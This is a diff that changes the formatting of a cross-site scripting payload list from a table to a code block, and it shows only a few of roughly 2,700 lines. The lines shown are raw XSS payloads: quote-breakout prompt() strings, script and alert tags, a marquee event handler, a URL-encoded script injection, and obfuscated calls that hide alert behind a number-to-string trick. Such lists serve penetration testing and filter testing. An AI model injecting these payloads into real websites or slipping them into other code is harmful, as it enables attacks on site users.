@@ -1,7 +1,7 @@
 XSS payloads list!
-| XSS List |
-| --- |
-| "-prompt(8)-"
+--
+
+```"-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
 ';a=prompt,a()//
@@ -2693,4 +2693,4 @@ foo<script>alert(1)</script>
 <marquee onstart='javascript:alert('1');'>=(◕_◕)=
 1%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(9728)%3C/ScRiPt%3E
 <<img src="X" onerror​=top[8680439..toString(30)](1337)>
-<​script>top[8680439..toString(30)](1337)<​/script> |
+<​script>top[8680439..toString(30)](1337)<​/script>```
